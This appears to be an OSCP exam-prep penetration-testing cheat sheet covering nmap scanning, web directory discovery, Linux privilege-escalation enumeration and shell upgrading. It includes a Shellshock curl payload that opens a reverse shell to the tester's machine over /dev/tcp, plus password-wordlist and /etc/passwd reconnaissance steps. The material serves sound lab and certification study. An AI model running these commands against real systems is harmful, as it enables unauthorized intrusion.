# Lab Machines
https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=0

# References
https://leecybersec.com

https://oscp.infosecsanyam.in/one-page-methodology

https://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob

https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/

# Scanning
> Try to scan as normaly as possible!
> 
> Scanning script: https://github.com/superkojiman/onetwopunch 

## TCP Scan
``` bash
ports=$(nmap -p- -T4 $ip | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//); echo $ports
```

## UDP Scan
``` bash
sudo nmap -sU -p- $ip
```

## Services Scan
``` bash
nmap -sC -sV -p$ports $ip
```
# Web application

## List URLs
``` bash
curl http://$ip -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
```

## Discovery files and directories
``` bash
gobuster dir -u http://$ip -w /usr/share/seclists/Discovery/Web-Content/
```

## Shellshock POC

```bash
gobuster dir -u http://$ip/ -w /usr/share/seclists/Discovery/Web-Content/cgis.txt
gobuster dir -u http://$ip/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/ -x txt,sh,php,cgi -s '200,204,403,500'
```
https://github.com/mubix/shellshocker-pocs
```bash
curl -H "user-agent: () { :; }; echo; /bin/bash -c 'bash -i >& /dev/tcp/$myip/445 0>&1'" http://$ip/cgi-bin/user.sh
```

## LFI to RCE Exploit with Perl Script
https://www.exploit-db.com/papers/12992

## Virtual hosting
Virtual hosting is a method for hosting multiple domain names (with separate handling of each name) on a single server (or pool of servers).

## Create passwd directory
``` bash
cewl -m 5 http://$ip/joomla/ > passwd.txt
```

# Upgrade shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
^Z
stty raw -echo
fg
export TERM=xterm
```
# \*nix Privilege Escalation
## References
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://gtfobins.github.io/ 

> LinEnum & unix-privesc-check

## Information Gathering
1. What's the OS? What version? What architecture?
```bash
cat /etc/*-release
uname -i
lsb_release -a (Debian based OSs)
```

2. Who are we? Where are we?
```bash
id
pwd
```

3. Who uses the box? What users? (And which ones have a valid shell)
```bash
cat /etc/passwd
grep -vE "nologin|false" /etc/passwd
```

4. What's currently running on the box? What active network services are there?
```bash
ps aux
netstat -antup
```

5. What's installed? What kernel is being used?
```bash
dpkg -l (Debian based OSs)
rpm -qa (CentOS / openSUSE )
uname -a
```

# Windows Privilege Escalation

# Update soon: https://leecybersec.gitbook.io/oscp/